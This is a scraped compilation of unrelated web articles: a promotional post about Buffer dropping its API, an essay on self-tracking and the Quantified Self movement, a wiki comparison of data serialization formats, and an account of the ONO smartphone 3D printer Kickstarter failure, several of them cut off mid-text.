<code>document.onkeydown</code></li></ul><p>Implementation:</p> </div>]]>

<h2>Buffer’s API is no more.</h2>



<p>I was an avid user of Buffer. For several companies I worked at or founded, I used Buffer to manually schedule my social media posts. Every day I would start my morning with researching post content material, writing a few posts, and scheduling these post to go out later in the day. </p>



<p>However, I quickly slowed down with creating these manual posts; I became distracted with other priorities as my company grew, or it was just laziness to think of new posts every day. Regardless, my social media engagement decreased as I posted less, which sucked.</p>



<figure><blockquote><p>Social media is an extension of your company identity in a way that is personal to your community.</p></blockquote></figure>



<p>Every founder and consumer-facing business leader knows how important social media is to growing a brand. Social media is an extension of your company identity in a way that is personal to your community. In a way that no other medium allows, my social media accounts allows me to connect to users in a real or perceived dialogue that is so essential for brand and reputation building.</p>



<p>As with most things in life, if it’s worth doing, it takes real effort.</p>



<p>Then I read an article, which I’m still hunting for, that was a slap your head “of course” moment: <strong>you can automate your organic social media</strong>. Instead of having to manually post every day I could take my existing content and post from my server-side, automating the entire process. I had tons of great data that could be automatically posted. All I needed was an API I could send my post through.</p>



<p>I went back to Buffer to use their API and bam!</p>



<figure><img loading="lazy" width="1024" height="284" src="https://ayrshare.positorgroup.com/wp-content/uploads/2020/10/Buffer-API-1024x284.jpg" alt="" srcset="https://www.ayrshare.com/wp-content/uploads/2020/10/Buffer-API-1024x284.jpg 1024w, https://www.ayrshare.com/wp-content/uploads/2020/10/Buffer-API-300x83.jpg 300w, https://www.ayrshare.com/wp-content/uploads/2020/10/Buffer-API-768x213.jpg 768w, https://www.ayrshare.com/wp-content/uploads/2020/10/Buffer-API.jpg 1394w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>The Message: Go Away</figcaption></figure>



<p>WTF!</p>



<p>In <a href="https://techcrunch.com/2012/08/01/social-media-manager-buffer-opens-api-to-developers-looks-to-become-widespread-sharing-standard/">7 short years</a>, or maybe long years in tech, <a href="https://www.buffer.com/">Buffer</a> went from offering and API to getting rid of it.</p>



<p>So what happened?</p>



<p>Based on the <a href="https://blog.loomly.com/buffer-integration-sunset/">email</a> Loomly got from Buffer, it at first looks like Buffer got in trouble with the social networks:</p>



<blockquote><p>We’ve determined that we can no longer permit certain usage of the Buffer API, especially when the posting goes beyond the stated agreements we have with the social networks.</p></blockquote>



<p>Ok, but simple abuse of posting happens whether manual or automatic. And you can build in safeguards, thresholds, and other protection mechanisms. </p>



<p>And then we come to:</p>



<blockquote><p>After an audit of existing API integrations, we’ve chosen to revoke access to third-party tools that&nbsp;provide similar functionality to Buffer’s core product, i.e. scheduling social media posts directly via&nbsp;social network&nbsp;APIs. These products can no longer utilize&nbsp;the Buffer&nbsp;API.</p></blockquote>



<p>Ah ha! Companies that essentially used Buffer as a proxy to post were no longer wanted as Buffer seemed to narrow its focus to media agencies. In this context, such a strategy to de-emphasize the API makes sense. After all, most agencies have teams of people creating content and manually scheduling and posting all day long.</p>



<p>It is a shame that Buffer dropped their API since there is a <a href="https://ayrshare.positorgroup.com/top-10-social-media-apis-for-developers/">shortage</a> of good solutions out there and it really is needed if you want to automated your social media. </p>



<p>This is the reason we created <a href="https://ayrshare.positorgroup.com/">Ayrshare</a>. We built it first for ourselves and then for users to automate posting to social media networks via an API. </p>



<p>So in a way, thanks Buffer!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><pre><span>🧠 The art, science and technology of understanding oneself. </span></pre><p><span>⏳Reading time: </span><strong><span>10 minutes</span></strong></p><p><em>"Hey Siri, am I a cyborg yet?"</em></p><p>You are a system. Well, a biological one, but a system nonetheless. An interconnected bunch of elements forming a complex whole. And as with many systems, it is subject to be analysed or even optimised. By studying it you gradually<span> develop a more complete picture of your mind and body. But the form in which we gather and interpret this information is changing. We now have access to tools and services that were unimaginable decades ago. And there's </span><em>a lot of data</em><span> that comes with it. Instead of getting analysis every few months from the doctor, we can now get it by the minute. Many people don't think about it twice, but others have begun to ask </span><strong>the question</strong><span>:</span></p><p><em>"How can I use my personal data to learn more about myself?"</em></p><p>Stephen Wolfram <em>(Wolfram Alpha / Mathematica CEO) </em>is one of these people. Back in 2012, Stephen published an essay titled <a href="https://writings.stephenwolfram.com/2012/03/the-personal-analytics-of-my-life/">"The Personal Analytics of My Life"</a>, exploring the vast amounts of data he collected about himself from the early 1990's to the early 2010's. Emails, phone calls, footsteps, keystrokes. <i>Yes, keystrokes. </i>Using this data, Stephen asks questions like "how many hours have I spent on the phone each day", or "how has my vocabulary evolved over the years", and analyses it using statistics and visualisation software. He hasn't stopped collecting data since then. In fact, he <em>regrets not starting sooner</em>, and not having more types of data to work with. Being a productivity guru, these insights help Stephen become more productive and do better work, especially since he runs a remote business and is involved in pretty much every aspect of the company. Surprised by the fact that nobody seemed as interested as he was in tracking this data, Stephen hoped that one day this will become the norm:&nbsp;</p><blockquote><p>One day everyone will routinely collect all sorts of data about themselves.</p></blockquote><p>Stephen had coined the term "Personal Analytics" - the use of <strong>self-tracking </strong>methods or <strong>self-monitoring </strong>devices to analyse one's own behaviour and physiological responses. He knew how to extract this data from various sources (via scripts, custom software and integrations) and process it using statistical tools (which he built) - technical know-how that many people don't have. In his words:&nbsp;</p><blockquote><p>My fundamental thing about personal analytics is, I don’t put any effort into collecting the data. I put effort into getting <em>systems</em> built to do it, and then I make sure the systems keep running.</p></blockquote><p>Building this kind of personal data infrastructure is not an easy task, and certainly not within reach of most people. But it is getting easier. For starters, a lot of this data is already collected for you - thanks to big tech corporations, love them or hate them. And the <em>systems </em>that Stephen was talking about - many are already in place. From your location history on Google to your sleep activity on Fitbit, it's all there. Today, the privilege of self-tracking is no longer reserved for the tech savvy data hoarders. As we go into the 2020's, we realise the vast amount of data that we've produced over the years, <em>especially the digital natives</em> - those who were born after 1980 and grew up immersed in gadgets. We've been scattering digital footprints across the devices we use, and generated tonnes of data, knowingly or not. Facebook has been around long enough that some people now have <em>14 years of data </em>on the platform. Others may have <em>30 years of emails</em>. This realisation may hit some people and lead them to ask that very question - <em>"what can I learn from all this?".&nbsp;</em></p><h2>The science of self-knowledge</h2><p>To understand the nature of self-tracking and personal analytics, first let's take a look at how we interpret ourselves in scientific terms:&nbsp;</p><p><strong><em>Introspection</em></strong></p><p>The philosophical term for being able to 'look inward'. The mental events of judging, deciding, reasoning, experiencing, imagining, and feeling are attributed to introspection.&nbsp;</p><p><em><strong>Observation</strong></em></p><p>Information about our internal condition that we receive and infer from our senses. It's a type of knowledge that we can easily measure and explain in rational terms. For example: looking at yourself in the mirror, or 'tuning in' to your bodily signals like hunger or heartbeat.&nbsp;</p><p>The validity and reliability of introspection is questioned amongst philosophers and cognitive scientists. Once seen as a reliable source of inner truth by philosophers, today the method has a number of limitations and criticisms. The very concept of being able to 'look into oneself' is fuzzy. We cannot introspect or control our own mental processes, especially when it comes to unconscious forms of bias, or explanations of our own reasoning. But we're aware of our unawareness. It is therefore normal to seek out complementary forms of knowledge about yourself. Those that are based on evidence - <em>facts, events and numbers</em>.&nbsp;</p><h2>The rise of self-tracking</h2><p>The particular motivation for self-tracking really depends on the person and their circumstances, but generally it's a matter of reflecting and acting upon one's life, in an effort to live healthier, better, and longer. <em>Fitter, happier, more productive</em><strong>. </strong>For instance, someone in their 20's might be looking for ways to minimise burnout and stress. Older folks may be concerned with their diet or cholesterol levels. Others may want to improve their sleep. Or keep track of every time they sneeze. Whatever the reason, people are digging into their digital data doubles and tracking data that has never been quantified before. You name it - it's probably being tracked by someone, somewhere.&nbsp;</p><h2>It all started with the weight scale</h2><figure><img loading="lazy" src="https://i.pinimg.com/474x/f6/b4/a2/f6b4a2c4ce4fb514c8d0fbbf92482d1e--vintage-scales-kitchen-scales.jpg" data-is-external-image="true" alt="An American penny scale" width="130" height="502"><figcaption>An American penny scale</figcaption></figure><p>The concept of self-tracking is not new, and goes back to the late 19th century, when 'penny scales' would allow people to record their own weight for the first time without visiting the doctor's office. Before scales made their way into people home's, they were <a href="https://www.youtube.com/watch?v=F_zDhUi-JjA">out in the public</a> - in grocery stores, pharmacies and banks. Reminding everyone to stay healthy, these grandfather-clock-looking devices became the first vending machine in the U.S that provided a service, not a product. Slot a penny in, get your weight and a satisfying bell sound. It was a huge commercial success - between the 1930's and 40's penny scales brought in over 1 billion pennies ($10 million annually). The messaging surrounding the scales was clear: <strong>those who weigh themselves often - know themselves well, and those who know themselves well - live well.&nbsp;</strong></p><p>By the time the first domestic scales appeared, a person's weight became an important form of self-knowledge, and once a standard table of height and weight was established, people not only knew their weight, but also what they 'should' weigh ideally. With this industry standard the public had the ability to manage their weight and optimise towards a target. This attached a level of self-worth to a number that we still see deeply reflected in our society today. As one participant of a study confessed:&nbsp;</p><blockquote><p>I don’t feel any way until I know the number on the scale. The numbers tell me how to feel.&nbsp;</p></blockquote><h2>Quantified Self</h2><p>A community that fully embraces <em>"self-knowledge through numbers"</em> is the <a href="https://quantifiedself.com/">Quantified Self</a> (QS) movement, which has now grown to 70,000 members around the world since it's foundation in 2007. Originally starting in Silicon Valley, it now encompasses a growing community forum, worldwide meet-ups and conferences, and even a QS institute. The community members learn from each other, share <a href="https://github.com/woop/awesome-quantified-self">tools and frameworks</a>, and constantly strive to get the most out of their data. The tech savvy ones may even build their own personal data infrastructure, similar to Stephen Wolfram, by writing scripts to fetch data from their software and hardware. Others may simply write down their moods on a piece of paper, hoping it will be useful some day. And then there's the dashboard enthusiasts, building admin panels to visualise their life in every possible way.&nbsp;</p><figure><figure><img loading="lazy" src="https://existentialist.xyz/media/posts/7/your_life.png" alt="Your life" width="300" height="284"></figure><figcaption>Imagine a fancy dashboard on that laptop screen. And a notification that says 'Constitution + 1'</figcaption></figure><p>While compelling, the Quantified Self movement also begs the question - <em>why</em>? Kevin Kelly, one of the founders of the Quantified Self movement, puts it this way:</p><blockquote><p>The real goal was always personalisation - to have an experiment of n=1. <strong>…</strong>&nbsp; Most medical research is performed at a very large scale where you have thousands of thousands of participants, otherwise it's not really considered valid. But in fact - none of us really want a treatment, therapy or regime that works for everybody - we want something that works for <em>us</em>. So instead of having an <em>n</em> of thousands, we're just going to experiment on ourselves (hence n=1). And if it works for us - then that's<em> all we need.</em>&nbsp;</p></blockquote><p>It's an interesting perspective pointing towards our increasingly individualistic society. The meaning of personalisation is important to consider in context here. Sure, while Apple Watch and Fitbit provide <em>personalised</em> dashboards, they are still designed for mass data collection and analysis. True personalisation comes from one actively taking ownership in the data, from collection to analysis and ultimately decision-making, in a way that works for them. This is the promise of Quantified Self. Although it's still far from the data-driven personal utopia, it hints at a society that's more self-aware than ever before. One where technology gives us a more complete picture of ourselves, and where our behaviour is partially rooted in the insights we get from our own data.&nbsp;</p><p>Of course, it would be delusional to assume that technology will give us all the answers. <em><strong>A</strong></em> <em><strong>truly quantified self&nbsp;is unthinkable&nbsp;</strong></em>by current standards, since there's so much of what makes us human that can't be quantified, or even rationally explained. This makes me wonder about the implications of the QS movement. Those that get spiralled down the rabbit hole of self-tracking for no apparent reason other than "this data might be useful someday" gives us a glimpse of the possible future. Although …</p></div></div>

October 23, 2020 | https://wiki.alopex.li/BetterThanJson | <a href="https://web.archive.org/web/*/https://wiki.alopex.li/BetterThanJson">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wikipage">

<p>I want to take a brief look at various data serialization formats and compare them. Basically the goal is to answer the question, “can we find something better than JSON?” However, note that we are looking at these things for DATA SERIALIZATION, not for config files and stuff, so that’s the goal by which these will be judged.</p>
<p>There’s two orthogonal axes to look at these things under:</p>
<ul>
<li>Self-describing vs.&nbsp;schema-defined formats</li>
<li>Human readable vs.&nbsp;machine-readable formats</li>
</ul>
<p>That is, whether the type information for a structure is defined in a separate file (a schema) that a receiving program checks against, or whether the message itself contains type information. It’s almost exactly the difference between statically and dynamically typed programming languages. Like programming languages, both have pros and cons, neither of them are always better than the other. The goal of this is to compare apples to apples, so we’re gonna note which category these things fall into but not make value judgements based on them. There’s also fuzzy edges; many self-describing formats optionally have a schema layer too. Similarly, we will not really compare tooling quality; the goal is to look at the intrinsic properties of the formats. The culture surrounding them may be considered though.</p>
<p>This is also important not to conflate with an RPC protocol, though many of these things are used IN RPC protocols. Keep in mind that HTTP/REST interfaces are often just a type of RPC protocol, whether realized that way or not.</p>
<p>Up to date as of October 2020. Doesn’t try to include myriad minor things, ’cause there’s only so much time in the world.</p>

<h2 id="json">JSON</h2>
<p><a href="http://json.org/">http://json.org/</a></p>
<p>What everything gets currently compared against. We all know JSON, we all agree it’s Sorta Good Enough but really is kinda crap.</p>
<p><strong>Category:</strong> Human-readable, self-describing. (<a href="https://json-schema.org/">https://json-schema.org/</a> exists but does not seem very widely used.) Has an <a href="https://en.wikipedia.org/wiki/JSON-RPC">RPC protocol</a> but it also seems lightly used, <a href="https://jsonapi.org/">this</a> might be more general.</p>
<p><strong>Users:</strong> Everyone</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Similar to major programming languages – Easy to understand and debug</li>
<li>Simple – Easy to read, write, and understand… at least for simple things. <a href="http://seriot.ch/parsing_json.php">Turns out there’s a lot of gotcha’s though.</a></li>
<li>Pretty compact if minified</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Type system is pretty shit – no date/time, no real integers, no real structs, no unions/tuples/etc</li>
<li>Tends to discourage schema’s – “So simple it doesn’t need it”, until it becomes less simple.</li>
<li>No normalized form – fields may be reordered, <em>duplicated</em>, etc. Makes hashing it hard, gotta read whole message to begin verifying it, etc.</li>
<li>No comments – harder to write well than you might think!</li>
<li>No good way to contain binary data</li>
</ul>
<h2 id="yaml">YAML</h2>
<p><a href="https://yaml.org/">https://yaml.org/</a></p>
<p>Started out as a simpler alternative to XML.</p>
<p><strong>Category:</strong> Human-readable, self-describing.</p>
<p><strong>Users:</strong> Lots of people</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Vaguely simple to read and write, in its basic form</li>
<li>Low visual noise</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Way too complicated – they made it a strict superset of JSON for some damn reason, and nobody uses that form, so it’s just a pile of wasted effort</li>
<li>Reference impl incomplete, other impl’s disagree with each other and the spec</li>
</ul>
<h2 id="xml">XML</h2>
<p><a href="https://en.wikipedia.org/wiki/XML">https://en.wikipedia.org/wiki/XML</a></p>
<p>Not sure anyone really knows how XML happened. It’s basically the W3C’s fault, I think? It’s okay for some things but in the end I’m not sure it’s something anyone actually <em>wants</em> to use, it’s just going to be one more of those mistakes of the past.</p>
<p><strong>Category:</strong> Human-readable, self-describing with common schema usage. Has an <a href="https://en.wikipedia.org/wiki/XML-RPC">RPC protocol</a> and many other complicated things.</p>
<p><strong>Users:</strong> Everyone who can’t avoid it.</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Promotes schemas and validation</li>
<li>Simple to use for simple things</li>
<li>Actually pretty decent for documents</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>I’ve never gotten schemas and validation to actually work in practice</li>
<li>Everything is string-ly typed</li>
<li>No real arrays</li>
<li>Complicated as frig</li>
<li>Very verbose</li>
<li>There’s like 3-4 different ways to do everything</li>
<li>Still no good way to contain binary data</li>
</ul>

<h2 id="protobuf">Protobuf</h2>
<p><a href="https://developers.google.com/protocol-buffers/">https://developers.google.com/protocol-buffers/</a></p>
<p>aka Protocol Buffers, but that’s a pretty dumb name. Google’s common, fast on-the-wire serialization format.</p>
<p><strong>Category:</strong> Machine-readable, schema-defined. Has an <a href="https://grpc.io/">RPC protocol</a> built around it.</p>
<p><strong>Users:</strong> Google, basically everyone</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Backed by Google, so it’s going to be good at the things Google values</li>
<li>Basically reasonable</li>
<li>Now has some support for versioning schemas, though it’s a hard problem in general</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Backed by Google, so it’s going to be good at the things Google values</li>
<li>Not particularly simple</li>
<li>Wire protocol may be more work than it needs to be</li>
<li>Its type system <a href="http://reasonablypolymorphic.com/blog/protos-are-wrong/index.html">could maybe be better</a></li>
</ul>
<h2 id="capn-proto">Cap’n Proto</h2>
<p><a href="https://capnproto.org/">https://capnproto.org/</a></p>
<p>The Other Binary Serialization Protocol.</p>
<p><strong>Category:</strong> Machine-readable, schema-defined. Designed primarily for RPC, which is built in to the reference implementation.</p>
<p><strong>Users:</strong> sandstorm.io, Cloudflare?, various other people but it doesn’t seem like that many</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Designed to be fast</li>
<li>Made by one of the people who worked heavily on Protobuf at Google, so <a href="https://capnproto.org/faq.html#how-do-i-make-a-field-required-like-in-protocol-buffers">there’s lots of experience behind it</a>. That said, doesn’t mean this cat’s always <em>right</em>, but there’s certainly opinions that are trying to be expressed.</li>
<li>Sophisticated RPC comes as part of the standard package</li>
<li>Designed for zero-copy deserialization</li>
<li>Designed for schema to evolve</li>
<li>Adorable name</li>
<li>Very explicit about correctness and conformance things such as field ordering and layout</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Very explicit about correctness and conformance things such as field ordering and layout</li>
<li>Lots of the docs and concepts are pretty low level, you usually ain’t gonna need it</li>
<li>Seems more complicated than protobuf – this might be one reason there’s fewer 3rd-party implementations</li>
</ul>
<h2 id="thrift">Thrift</h2>
<p><a href="https://thrift.apache.org/">https://thrift.apache.org/</a></p>
<p>Apache’s version of Protobuf. Does anyone actually use this? Facebook, apparently, since they invented it and then gave it to Apache. Anyone else?</p>
<p><strong>Category:</strong> Machine-readable, schema-defined. Designed primarily for RPC.</p>
<p><strong>Users:</strong> Basically mostly Facebook? Twitter and AirBNB also apparently use it, so apparently it’s not UNpopular.</p>
<p><strong>Pros:</strong></p>
<ul>
<li>It works?</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Docs suck</li>
<li>Apache is the tragic junkyard of open source projects</li>
<li>Apparently still not as good as flatbuffers, see below</li>
</ul>
<h2 id="flatbuffers">Flatbuffers</h2>
<p><a href="https://google.github.io/flatbuffers/">https://google.github.io/flatbuffers/</a></p>
<p>Feels a little like Google’s answer to Cap’n Proto, as it has some of the same design goals – zero-copy serialization and layouts that are more amenable to versioning.</p>
<p><strong>Category:</strong> Machine-readable, schema-defined. Includes RPC protocol.</p>
<p><strong>Users:</strong> Google, Cocos2D, Facebook’s mobile client</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Designed for zero-copy deserialization</li>
<li>Designed for schema to evolve</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Kinda feels like the problem is already solved by capnp</li>
<li>Includes a JSON parser for some reason?</li>
<li>Type system is kinda anemic with regards to unions</li>
</ul>
<h2 id="cbor">CBOR</h2>
<p><a href="https://cbor.io/">https://cbor.io/</a></p>
<p>Basically a binary re-imagining of JSON.</p>
<p><strong>Category:</strong> Machine-readable, self-describing.</p>
<p><strong>Users:</strong> ???</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Pretty good type system – there’s things like fixnum’s, datetime’s, blobs, etc</li>
<li>Compact</li>
<li>Built-in extensibility</li>
<li>Designed to be a drop-in replacement for JSON</li>
<li>IETF standard</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Kinda more complicated than it needs to be, though this is for the sake of compactness and comprehensive types. Numbers are densely packed into fewer bits when possible, for example.</li>
<li>Doesn’t actually seem that widely adopted for some reason?</li>
</ul>
<h2 id="msgpack">Msgpack</h2>
<p><a href="https://msgpack.org/">https://msgpack.org/</a></p>
<p>The Other CBOR, or rather, <a href="https://news.ycombinator.com/item?id=14067747">CBOR is derived from this</a>. Designed to be simple and compact. Kinda a <em>lot</em> like a slightly chopped down CBOR, actually, their integer specification stuff looks nearly identical.</p>
<p><strong>Category:</strong> Machine-readable, self-describing.</p>
<p><strong>Users:</strong> Redis, a few others?</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Simple</li>
<li>Compact</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Specification is kinda weak</li>
<li>No real tuple or enum types</li>
<li>Why not just CBOR?</li>
</ul>
<h2 id="bson">BSON</h2>
<p><a href="http://bsonspec.org/">http://bsonspec.org/</a></p>
<p>As the name implies, a binary-ifcation of JSON. Created by MongoDB as its internal data format.</p>
<p><strong>Category:</strong> Machine-readable, self-describing.</p>
<p><strong>Users:</strong> MongoDB</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Type system is full of deprecated and MongoDB-specific shit but is reasonably pragmatic</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Type system is reasonably pragmatic but is full of deprecated and MongoDB-specific shit</li>
<li><strong>C strings</strong> – though there’s random non-C strings in places as well.</li>
<li>Its arrays are a travesty against serializarion</li>
<li>Basically an implementation detail of MongoDB, and it looks like it</li>
</ul>

<p>Things that are interesting but not actually in the scope of serialization languages, or are otherwise irrelevant.</p>
<h2 id="toml">TOML</h2>
<p><a href="https://github.com/toml-lang/toml">https://github.com/toml-lang/toml</a></p>
<p>Invalid, it’s designed as a config language, not a serialization format. It’s basically an attempt to make something as simple and ubiquitous as windows .INI files that is an actual specification rather than a fashion.</p>
<p><strong>Category:</strong> Human-readable, sorta self-describing though usually you have a specific data structure you’re trying to fit it into.</p>
<p><strong>Users:</strong> Various, notably Cargo (Rust’s build tool)</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Work well as a config language without deeply nested structures</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Works poorly when you try to make deeply nested structures</li>
</ul>
<h2 id="ron">RON</h2>
<p><a href="https://github.com/ron-rs/ron">https://github.com/ron-rs/ron</a></p>
<p>Rusty Object Notation. Because shoehorning Rust’s ML-y type systeminto JSON isn’t very much fun. Works startlingly well for this purpose but is basically untried elsewhere.</p>
<p><strong>Category:</strong> Human-readable, sorta self-describing though usually you have a specific data structure you’re trying to fit it into.</p>
<p><strong>Users:</strong> A few, notably <a href="https://amethyst.rs/">Amethyst</a>.</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Good type system for sophisticated functional-style languages</li>
<li>Simple and reasonably compact</li>
<li>Actually very good at what it does</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Young, underspecified, Rust-centric</li>
</ul>
<h2 id="bincode">Bincode</h2>
<p><a href="https://github.com/servo/bincode">https://github.com/servo/bincode</a></p>
<p>Included mainly for completeness. It’s not standardized outside of a single particular implementation which doesn’t promise stability, so not intended for general-purpose use. It’s intended as a fast and easy RPC/IPC format for Servo, and the actual format is basically an implementation detail of that goal.</p>
<p><strong>Users:</strong> Servo, programs written by introverts who don’t care about being able to talk to each other. (Turns out this is a useful niche though, who knew.)</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Compact, fast, simple.</li>
<li>Works basically transparently for IPC with Rust code.</li>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Following on from the 2013 to 2014 boom, optimism in the 3D printing industry in early 2016 was rife, and backers were clamoring to support Kickstarter projects claiming to revolutionize the sector. Many fledgling Kickstarter projects became extraordinarily successful. Formlabs even went unicorn.<span data-ez-name="3dsourced_com-box-3"></span></p><p>But some projects bordered into naïve, buoyed by fashionable buzzwords and heavily padded announcement videos. Several projects raised over a million dollars, sometimes based only on ambitious – perhaps far-fetched – targets and little evidence of feasibility, and as the months drew on, never even produced a final product for backers to be disappointed with.</p><p>One project however stands head and shoulders above others for its disaster: in magnitude of failure; amount of money lost; and emotional turmoil. It has been called the biggest 3D printing scam of all time, taking $2.3 million from 16,180 backers. For the next four years, they relentlessly teased supporters that they were days from receiving their printer, just to let them down again.<span data-ez-name="3dsourced_com-medrectangle-3"></span></p><p>Here’s how it unfolded. This is the story of the ONO.</p><h2><span id="OLO_The_first_days"></span>OLO: The first days<span></span></h2><p>The OLO 3D printer <a href="https://www.kickstarter.com/projects/olo3d/olo-the-first-ever-smartphone-3d-printer" target="_blank" rel="noreferrer noopener">campaign</a> went live on Kickstarter on March 21<sup>st</sup>, 2016, promising a $99 <a rel="noreferrer noopener" href="https://3dsourced.com/3d-printers/resin-dlp-sla-3d-printer-stereolithography/" target="_blank">resin 3D printer</a> that used your smartphone screen’s light to solidify resin and create a finished model. Back in 2016 resin 3D printers started at a few thousand dollars, and even in the present day $99 is absurdly cheap – but OLO said they could do it for less than $100.</p><p>Normal resin printers use a powerful light source to cure and solidify resin. Instead of using standard UV resins, OLO’s phone printer system used a daylight-sensitive resin that your phone screen’s comparatively weak light source could still polymerize. The tech made sense in theory, and if perfected anyone with a smartphone could 3D print. OLO made 3D printing accessible, and at the lowest prices the world had ever seen.</p><p>The world noticed. OLO targeted $80,000 to make the project a reality and deliver the technology to market. Kickstarter campaigns run for 30 days, OLO hit their target in 33 minutes. The project was a roaring success.</p><h2><span id="The_First_Cracks"></span>The First Cracks<span></span></h2><p>Some were still sceptical amidst the hype and optimism. Angus Deveson, better known as Maker’s Muse, was unconvinced. As the campaign hit $1M in funding, he posted a video outlining his concerns about the project’s feasibility.<span data-ez-name="3dsourced_com-large-leaderboard-2"></span></p><p>Firstly, the resins. Low cost resin printers at the time often used DLP technology – <a href="https://3dsourced.com/3d-printing-technologies/digital-light-processing-dlp/" target="_blank" rel="noreferrer noopener">Digital Light Processing</a> – a technology also used in cinema projectors. The light source used is immensely powerful as to cure photo-sensitive resin, and exponentially more powerful than a smartphone’s screen.</p><p>Using your smartphone’s comparatively weak light source, prints could take a whole day – possibly longer than your phone’s battery life. This is time where you cannot even look at your phone, never mind use it. Could people handle that level of inconvenience?</p><p>Additionally, the OLO Kickstarter video and photos shows clear resin bottles for their daylight-sensitive resins, which would cause the resin to instantly cure and harden in the bottle far before you could print with it. Resins are always packed into matte black containers to avoid this.</p><figure><img loading="lazy" width="700" height="400" src="https://i0.wp.com/3dsourced.com/wp-content/uploads/2020/06/ONO-Clear-Resin-Bottles.jpg?resize=700%2C400&amp;ssl=1" alt="ono clear resin bottles" srcset="https://i0.wp.com/3dsourced.com/wp-content/uploads/2020/06/ONO-Clear-Resin-Bottles.jpg?w=700&amp;ssl=1 700w, https://i0.wp.com/3dsourced.com/wp-content/uploads/2020/06/ONO-Clear-Resin-Bottles.jpg?resize=300%2C171&amp;ssl=1 300w" sizes="(max-width: 700px) 100vw, 700px" data-recalc-dims="1"><figcaption>OLO original Kickstarter image, with clear resin bottles.</figcaption></figure><p>Most dangerously, Maker’s Muse highlighted the blatant safety errors in the video: resins are harmful and should not be handled without gloves and goggles, and not just washed in water as the video demonstrated.</p><p>In a grimly prophetic statement in his 27<sup>th</sup> March 2016 video discussing the project, Angus surmised that he felt OLO was a world away from being production ready: <em>‘You may be waiting a very long time to get this project.’</em> The campaign was only six days old.</p><h2><span id="Fake_it_till_you_make_it"></span>Fake it till you make it?<span></span></h2><p>It is unofficially accepted that for many technology campaigns on Kickstarter, creative liberties are taken to show supposed market-ready prototypes. This is not necessarily bad, executing a precocious vision is requisite for greatness, and it is difficult to get people excited about a project if you do not have the funds to create said exciting project. Therefore, companies seeking investment tell white lies, show what the product will look like post-investment, rather than how it is now.</p><p>Many of the 16,000 backers were aware they were bridging the gap between vision and reality with their support. So, when Maker’s Muse pointed out that many of the objects shown in their campaign were clearly laser cut rather than printed on their machines, it did not cause the outrage that perhaps it should have. Slick marketing blurred the lines between fantasy and falsity, between hype and fraud.</p><p>One thing deducible from the laser cut parts was that OLO was not a working prototype. The parts the OLO team said their machines had printed were assuredly not printed by those machines. The question was not whether they did print those models, but whether they ever could.</p><figure><img loading="lazy" width="800" height="400" src="https://i2.wp.com/3dsourced.com/wp-content/uploads/2020/06/Laser-Cut-Part.jpg?resize=800%2C400&amp;ssl=1" alt="ono 3d printer parts that appear to be laser cut" srcset="https://i2.wp.com/3dsourced.com/wp-content/uploads/2020/06/Laser-Cut-Part.jpg?w=800&amp;ssl=1 800w, https://i2.wp.com/3dsourced.com/wp-content/uploads/2020/06/Laser-Cut-Part.jpg?resize=300%2C150&amp;ssl=1 300w, https://i2.wp.com/3dsourced.com/wp-content/uploads/2020/06/Laser-Cut-Part.jpg?resize=768%2C384&amp;ssl=1 768w" sizes="(max-width: 800px) 100vw, 800px" data-recalc-dims="1"><figcaption>This part looks laser cut rather than 3D printed, as echoed by Maker’s Muse.</figcaption></figure><p>Though in the Kickstarter campaign it was claimed to be a San Francisco-based project, OLO’s founders are in fact Italian. The two founders, Filippo Moroni and Pietro Gabriele, claim to have 15 years’ experience in the 3D printing industry in a company called Solido3D, as well as founding a 3D printing network called Fonderie Digitali. While on face value this adds prestige, further research unveils red flags.</p><h2><span id="From_OLO_to_ONO_to_Oh_No"></span>From OLO to ONO to Oh No<span></span></h2><p>Following the successful campaign, patrons waited excitedly for their OLO printers, having been promised delivery within a few short months. A few months later, on August 29<sup>th</sup>, 2016, OLO posted an update detailing how a similar-named company had contacted them with their grievances, and that therefore they were changing their name from OLO to ONO. This was perhaps symbolic for the four following years.</p><p>Resin 3D printers use a print bed which, upon finishing each solidified layer of resin, descends a small amount so that the next layer of liquid resin can be solidified. OLO’s original design controlled the print bed by plugging into your smartphone’s headphone jack and sending audio signals that act as directions, communicating when to move the print bed as each layer finishes. Many felt this was unnecessarily complicated and they should just use a Bluetooth method, but they pressed on with the headphone jack plan. It had already delayed the printer’s release due to issues with some phones having headphone jacks on top, while some had them on the bottom.</p><p>However, as they scrambled to fix these issues, phones were beginning to cut the headphone jack out entirely. The iPhone 7 released in September 2016, the highest profile of early phones to ditch the headphone jack. Suddenly all ONO’s planning was obsolete. A Bluetooth device was eventually decided on. </p><p>On March 22nd 2017, almost nine months after the original shipping date, ONO announced they would start shipping units the following day, on the 23rd. However, after going silent they eventually posted an update on April 10th discussing a last-minute issue with their electrical boards. The ordeal meant that a year after their promised delivery date, no printers were arriving on any backers’ doorsteps.</p><figure><img loading="lazy" width="700" height="450" 